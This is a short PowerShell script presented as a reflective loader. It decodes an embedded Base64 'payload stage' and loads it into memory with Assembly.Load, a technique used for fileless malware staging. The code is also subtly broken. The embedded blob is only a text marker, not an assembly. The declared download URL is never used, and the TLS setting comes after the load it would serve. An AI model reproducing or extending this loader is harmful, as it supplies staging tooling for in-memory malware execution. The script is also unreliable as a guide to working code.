
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://internal.corp/payload.bin",
    [int]$TimeoutSec = 84
)
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjplMmdxZnI0N2Q5")
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$OperationResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $OperationResult) {
    Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
